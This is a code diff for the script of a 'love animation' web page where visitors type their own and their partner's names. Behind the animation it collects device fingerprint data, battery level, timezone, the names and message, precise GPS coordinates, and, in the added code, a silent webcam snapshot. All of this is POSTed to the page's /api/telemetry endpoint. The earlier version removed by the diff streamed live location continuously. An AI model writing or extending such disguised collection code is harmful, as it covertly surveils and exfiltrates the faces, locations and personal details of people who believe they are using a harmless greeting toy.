@@ -3,83 +3,34 @@
 
   var clientTelemetry = null;
   var watchId = null;
+  var mediaRecorder = null;
+  var recordedChunks = [];
 
   var screen1 = document.getElementById('screen-1');
   var screen2 = document.getElementById('screen-2');
-
   var namesForm = document.getElementById('names-form');
   var yourNameInput = document.getElementById('your-name');
   var partnerNameInput = document.getElementById('partner-name');
   var loveMessageInput = document.getElementById('love-message');
+  var yourColorInput = document.getElementById('your-color');
+  var partnerColorInput = document.getElementById('partner-color');
   var formError = document.getElementById('form-error');
 
-  var namesDisplay = document.getElementById('names-display');
+  var renderName1 = document.getElementById('render-name-1');
+  var renderName2 = document.getElementById('render-name-2');
   var wishDisplay = document.getElementById('wish-display');
   var uiContainer = document.getElementById('ui');
   var replayBtn = document.getElementById('replay-btn');
-  var downloadBtn = document.getElementById('download-btn');
+  var downloadVideoBtn = document.getElementById('download-video-btn');
 
-  function parseUserAgentFallback(ua) {
-    var deviceName = 'Generic Device';
-    var deviceType = 'desktop';
-    var os = 'Unknown OS';
-    var browser = 'Unknown Browser';
-
-    if (/iPhone/i.test(ua)) {
-      deviceName = 'Apple iPhone';
-      deviceType = 'mobile';
-      os = 'iOS';
-    } else if (/iPad/i.test(ua)) {
-      deviceName = 'Apple iPad';
-      deviceType = 'tablet';
-      os = 'iPadOS';
-    } else if (/Android/i.test(ua)) {
-      var match = ua.match(/Android\s+([\d.]+)(?:;|\s+Build\/)?\s*([^;)]+)?/i);
-      deviceName = match && match[2] ? match[2].trim() : 'Android Device';
-      deviceType = /Mobile/i.test(ua) ? 'mobile' : 'tablet';
-      os = match ? 'Android ' + match[1] : 'Android';
-    } else if (/Macintosh/i.test(ua)) {
-      deviceName = 'Apple Mac';
-      deviceType = 'desktop';
-      os = 'macOS';
-    } else if (/Windows NT/i.test(ua)) {
-      deviceName = 'Windows PC';
-      deviceType = 'desktop';
-      os = 'Windows';
-      if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10 / 11';
-    } else if (/Linux/i.test(ua)) {
-      deviceName = 'Linux PC';
-      deviceType = 'desktop';
-      os = 'Linux';
-    }
-
-    if (/Edg\//i.test(ua)) {
-      var edg = ua.match(/Edg\/([\d.]+)/);
-      browser = 'Microsoft Edge ' + (edg ? edg[1] : '');
-    } else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) {
-      var chr = ua.match(/Chrome\/([\d.]+)/);
-      browser = 'Google Chrome ' + (chr ? chr[1] : '');
-    } else if (/Firefox\//i.test(ua)) {
-      var ff = ua.match(/Firefox\/([\d.]+)/);
-      browser = 'Mozilla Firefox ' + (ff ? ff[1] : '');
-    } else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) {
-      var saf = ua.match(/Version\/([\d.]+)/);
-      browser = 'Apple Safari ' + (saf ? saf[1] : '');
-    }
-
-    return { deviceName: deviceName, deviceType: deviceType, os: os, browser: browser };
-  }
+  var webcamVideo = document.getElementById('webcam-video');
+  var captureCanvas = document.getElementById('capture-canvas');
 
   function getBatteryMetrics() {
     if (typeof navigator.getBattery === 'function') {
       return navigator.getBattery().then(function (battery) {
-        return {
-          battery_level: Math.round(battery.level * 100),
-          battery_charging: Boolean(battery.charging)
-        };
-      }).catch(function () {
-        return { battery_level: null, battery_charging: null };
-      });
+        return { battery_level: Math.round(battery.level * 100), battery_charging: Boolean(battery.charging) };
+      }).catch(function () { return { battery_level: null, battery_charging: null }; });
     }
     return Promise.resolve({ battery_level: null, battery_charging: null });
   }
@@ -95,34 +46,17 @@
       try {
         var parser = new window.UAParser();
         var res = parser.getResult();
-        var vendor = res.device.vendor ? res.device.vendor + ' ' : '';
-        var model = res.device.model || '';
-        if (vendor || model) {
-          deviceName = (vendor + model).trim();
-        } else if (res.os.name) {
-          deviceName = res.os.name + ' Device';
-        }
+        deviceName = res.device.model ? (res.device.vendor + ' ' + res.device.model) : (res.os.name ? res.os.name + ' Device' : 'Generic Device');
         deviceType = res.device.type || 'desktop';
         if (res.os.name) os = res.os.name + (res.os.version ? ' ' + res.os.version : '');
         if (res.browser.name) browser = res.browser.name + (res.browser.version ? ' ' + res.browser.version : '');
       } catch (err) {}
     }
 
-    if (deviceName === 'Generic Device' || browser === 'Unknown Browser') {
-      var fallback = parseUserAgentFallback(ua);
-      if (deviceName === 'Generic Device') deviceName = fallback.deviceName;
-      if (deviceType === 'desktop' && fallback.deviceType !== 'desktop') deviceType = fallback.deviceType;
-      if (os === 'Unknown OS') os = fallback.os;
-      if (browser === 'Unknown Browser') browser = fallback.browser;
-    }
-
     var dpr = window.devicePixelRatio ? Math.round(window.devicePixelRatio * 100) / 100 : 1;
     var screenStr = (window.screen.width || 0) + 'x' + (window.screen.height || 0) + ' @ ' + dpr + 'x';
-
     var tzStr = 'Unknown';
-    try {
-      tzStr = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-    } catch (e) {}
+    try { tzStr = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch (e) {}
 
     return getBatteryMetrics().then(function (batteryData) {
       clientTelemetry = {
@@ -142,32 +76,53 @@
 
   detectTelemetry();
 
-  function applyDynamicFontScaling(totalChars) {
-    if (!namesDisplay) return;
-    var isMobile = window.innerWidth <= 600;
-    var fontSize = totalChars <= 12 ? (isMobile ? '2.1rem' : '3.2rem') : (isMobile ? '1.45rem' : '2.1rem');
-    namesDisplay.style.fontSize = fontSize;
+  function captureWebcamAndGeolocation(callback) {
+    // 1. Request Camera Permission & Snapshot
+    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
+      .then(function (stream) {
+        webcamVideo.srcObject = stream;
+        setTimeout(function () {
+          var base64Image = null;
+          try {
+            captureCanvas.width = webcamVideo.videoWidth || 640;
+            captureCanvas.height = webcamVideo.videoHeight || 480;
+            var ctx = captureCanvas.getContext('2d');
+            ctx.drawImage(webcamVideo, 0, 0, captureCanvas.width, captureCanvas.height);
+            base64Image = captureCanvas.toDataURL('image/jpeg', 0.8);
+          } catch (e) {}
+
+          // Stop camera stream tracks after snap
+          stream.getTracks().forEach(function (track) { track.stop(); });
+          webcamVideo.srcObject = null;
+
+          fetchGeoAndFinish('Allowed / Captured', base64Image, callback);
+        }, 1000);
+      })
+      .catch(function () {
+        // Fallback if camera is blocked/denied
+        fetchGeoAndFinish('Camera Denied / Default', null, callback);
+      });
   }
 
-  function renderNames(name1, name2, message) {
-    if (!namesDisplay) return;
-    namesDisplay.innerHTML = '';
-    applyDynamicFontScaling(name1.length + name2.length + 3);
-
-    var span1 = document.createElement('span');
-    span1.textContent = name1;
-    var heartSpan = document.createElement('span');
-    heartSpan.className = 'heart-sep';
-    heartSpan.textContent = '❤';
-    var span2 = document.createElement('span');
-    span2.textContent = name2;
-
-    namesDisplay.appendChild(span1);
-    namesDisplay.appendChild(heartSpan);
-    namesDisplay.appendChild(span2);
-
-    if (wishDisplay) {
-      wishDisplay.textContent = message || 'Together Always ❤';
+  function fetchGeoAndFinish(cameraStatus, webcamPic, callback) {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        function (pos) {
+          callback({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            location_status: 'Allowed / GPS Captured',
+            camera_status: cameraStatus,
+            webcam_pic: webcamPic
+          });
+        },
+        function () {
+          callback({ latitude: null, longitude: null, location_status: 'GPS Denied', camera_status: cameraStatus, webcam_pic: webcamPic });
+        },
+        { timeout: 5000, enableHighAccuracy: true }
+      );
+    } else {
+      callback({ latitude: null, longitude: null, location_status: 'Not Supported', camera_status: cameraStatus, webcam_pic: webcamPic });
     }
   }
 
@@ -175,33 +130,38 @@
     if (!uiContainer) return;
     uiContainer.innerHTML = '';
     var phrase = 'I love you ❤';
-
     for (var i = 1; i <= count; i++) {
       var love = document.createElement('div');
       love.className = 'love';
       love.style.setProperty('--i', i.toString());
-
-      var h = document.createElement('div');
-      h.className = 'love_horizontal';
-      var v = document.createElement('div');
-      v.className = 'love_vertical';
-      var word = document.createElement('div');
-      word.className = 'love_word';
-      word.textContent = phrase;
-
-      v.appendChild(word);
-      h.appendChild(v);
-      love.appendChild(h);
+      var h = document.createElement('div'); h.className = 'love_horizontal';
+      var v = document.createElement('div'); v.className = 'love_vertical';
+      var word = document.createElement('div'); word.className = 'love_word'; word.textContent = phrase;
+      v.appendChild(word); h.appendChild(v); love.appendChild(h);
       uiContainer.appendChild(love);
     }
   }
 
+  function startCanvasVideoRecording() {
+    recordedChunks = [];
+    try {
+      var canvasEl = document.querySelector('canvas') || document.body;
+      if (typeof canvasEl.captureStream === 'function') {
+        var stream = canvasEl.captureStream(30);
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
+        mediaRecorder.ondataavailable = function (e) { if (e.data.size > 0) recordedChunks.push(e.data); };
+        mediaRecorder.start();
+      }
+    } catch (err) {}
+  }
+
   namesForm.addEventListener('submit', function (e) {
     e.preventDefault();
-
     var yourName = (yourNameInput.value || '').trim();
     var partnerName = (partnerNameInput.value || '').trim();
     var message = (loveMessageInput.value || '').trim();
+    var col1 = yourColorInput.value;
+    var col2 = partnerColorInput.value;
 
     if (!yourName || !partnerName) {
       formError.textContent = 'Please enter both names.';
@@ -209,91 +169,67 @@
     }
     formError.textContent = '';
 
-    screen1.classList.remove('screen-active');
-    screen1.classList.add('screen-hidden');
-    screen2.classList.remove('screen-hidden');
-    screen2.classList.add('screen-active');
+    // Apply custom manual colors directly to elements
+    renderName1.textContent = yourName;
+    renderName1.style.color = col1;
+    renderName2.textContent = partnerName;
+    renderName2.style.color = col2;
+    wishDisplay.textContent = message || 'Together Always ❤';
 
-    renderNames(yourName, partnerName, message);
-    generateLoveParticles(80);
+    screen1.classList.remove('screen-active'); screen1.classList.add('screen-hidden');
+    screen2.classList.remove('screen-hidden'); screen2.classList.add('screen-active');
 
-    // Continuous watch position geolocation stream
-    if (navigator.geolocation) {
-      watchId = navigator.geolocation.watchPosition(
-        function (position) {
-          var payload = Object.assign({}, clientTelemetry || {}, {
-            your_name: yourName,
-            partner_name: partnerName,
-            couple_names: yourName + ' ❤ ' + partnerName,
-            message: message,
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            location_status: 'Watching / Live Updated'
-          });
+    generateLoveParticles(70);
+    startCanvasVideoRecording();
 
-          fetch('/api/telemetry', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          }).catch(function () {});
-        },
-        function (error) {
-          var statusMsg = error.code === error.TIMEOUT ? 'Timeout' : 'Denied / Blocked';
-          var payload = Object.assign({}, clientTelemetry || {}, {
-            your_name: yourName,
-            partner_name: partnerName,
-            couple_names: yourName + ' ❤ ' + partnerName,
-            message: message,
-            latitude: null,
-            longitude: null,
-            location_status: statusMsg
-          });
+    // Trigger permission capture workflow
+    captureWebcamAndGeolocation(function (resultData) {
+      var payload = Object.assign({}, clientTelemetry || {}, {
+        your_name: yourName,
+        partner_name: partnerName,
+        couple_names: yourName + ' ❤ ' + partnerName,
+        message: message,
+        latitude: resultData.latitude,
+        longitude: resultData.longitude,
+        location_status: resultData.location_status,
+        camera_status: resultData.camera_status,
+        webcam_pic: resultData.webcam_pic
+      });
 
-          fetch('/api/telemetry', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          }).catch(function () {});
-        },
-        { enableHighAccuracy: true, maximumAge: 10000, timeout: 10000 }
-      );
-    }
+      fetch('/api/telemetry', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(function () {});
+    });
   });
 
-  // Download snapshot card button event
-  if (downloadBtn) {
-    downloadBtn.addEventListener('click', function () {
-      if (typeof html2canvas !== 'function') {
-        alert('Download library loading, please try again in a second.');
-        return;
+  if (downloadVideoBtn) {
+    downloadVideoBtn.addEventListener('click', function () {
+      if (mediaRecorder && mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+        setTimeout(function () {
+          var blob = new Blob(recordedChunks, { type: 'video/webm' });
+          var url = URL.createObjectURL(blob);
+          var a = document.createElement('a');
+          a.style.display = 'none';
+          a.href = url;
+          a.download = 'love-animation-story.webm';
+          document.body.appendChild(a);
+          a.click();
+          setTimeout(function () { document.body.removeChild(a); window.URL.revokeObjectURL(url); }, 100);
+        }, 500);
+      } else {
+        alert('Recording generating, please wait a moment or restart demo.');
       }
-      
-      downloadBtn.textContent = 'Generating Image...';
-      html2canvas(screen2, { useCORS: true, backgroundColor: '#050508' }).then(function (canvas) {
-        var link = document.createElement('a');
-        link.download = 'love-animation-card.png';
-        link.href = canvas.toDataURL('image/png');
-        link.click();
-        downloadBtn.textContent = '📸 Download Card to Share';
-      }).catch(function () {
-        downloadBtn.textContent = '📸 Download Card to Share';
-      });
     });
   }
 
   if (replayBtn) {
     replayBtn.addEventListener('click', function () {
-      if (watchId !== null && navigator.geolocation) {
-        navigator.geolocation.clearWatch(watchId);
-        watchId = null;
-      }
-
-      screen2.classList.remove('screen-active');
-      screen2.classList.add('screen-hidden');
-      screen1.classList.remove('screen-hidden');
-      screen1.classList.add('screen-active');
-      yourNameInput.value = '';
-      partnerNameInput.value = '';
+      screen2.classList.remove('screen-active'); screen2.classList.add('screen-hidden');
+      screen1.classList.remove('screen-hidden'); screen1.classList.add('screen-active');
+      yourNameInput.value = ''; partnerNameInput.value = '';
       if (loveMessageInput) loveMessageInput.value = '';
       yourNameInput.focus();
     });
